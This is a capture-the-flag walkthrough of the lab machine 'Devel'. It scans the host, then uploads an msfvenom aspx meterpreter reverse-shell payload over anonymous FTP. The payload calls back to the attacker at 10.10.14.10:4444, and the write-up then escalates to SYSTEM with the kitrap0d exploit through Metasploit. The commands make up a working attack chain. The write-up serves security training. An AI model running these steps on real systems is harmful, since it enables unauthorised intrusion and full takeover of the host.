# Devel

IP: `10.10.10.5`

## Initial recon

```sh
nmap -A -T5 -p- 10.10.10.5
```

results
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 01:22 EDT
Nmap scan report for 10.10.10.5
Host is up (0.082s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-19-20  01:23PM                30442 dog.jpg
| 03-19-20  02:00PM                 2852 ex.aspx
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows Vista|2008|7|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   86.30 ms 10.10.14.1
2   87.06 ms 10.10.10.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.91 seconds
```

## Interpretation of results

Seems like there is a FTP where I can put files on. Additionally, there is a frontend on port `80` where I can arbitrarily execute files. This may be a reverse shell exploit.

Navigating to this webside, we see that this is an ASP.net web site. So we will generate the according payload for this machine.

## Generating the payload

From this msfvenom cheat sheet: https://netsec.ws/?p=331, we will use the aspx payload command.

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f aspx > shell.aspx
```

**Important note**!: Make sure to use the `tun0` inet IP from `ifconfig` instead of the `eth0`
## Setting up the listener for reverse shell
In a new tab, we are going to run the exploit handler to listen on a port

```sh
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.10
```

## Putting payload onto the server

```sh
ftp 10.10.10.5
ftp> put shell.aspx
```

## Running the reverse shell

Navigate to the website URL `http://10.10.10.5/shell.aspx`
And boom! We have a meterpreter shell.

## Reverse shell

After getting the reverse shell, running a quick `getuid` gives back a non-root user. 

Trying to elevate:

```sh
getsystem
```

annd it doesn't work.

## Post explotation

Let's try to elevate to root
First, background the meterpreter shell
```sh
background # background the meterpreter
```

Let's see if there are any suggestions for exploits

```sh
search suggester
use post/multi/recon/local_exploit_suggester
set session 1 # the session ID of our meterpreter shell
run
```

The possible exploit suggestions:

```
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

## Root privelege elevation

Let's try the kitrap0d one

```sh
use exploit/windows/local/ms10_015_kitrap0d
set session 1
```

and it returns

```
[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Launching notepad to host the exploit...
[+] Process 336 launched.
[*] Reflectively injecting the exploit DLL into 336...
[*] Injecting exploit into 336 ...
[*] Exploit injected. Injecting payload into 336...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
```

but no session was created! WHY?

This is because the lhost defaulted to our `eth0` interface, which is incorrect. It should be on the `tun0` interface.

So we need to set the lhost again

```sh
set lhost 10.10.14.10
run
```

And now we finally have a root meterpreter shell

```sh
getuid
# NT AUTHORITY\SYSTEM
```

Get the flags and we are done

## Takeaways

1. There may be multiple stages to an exploit, not just running a script.
2. Knowing the background on a web framework can be helpful.
3. Reverse shells can be tricky.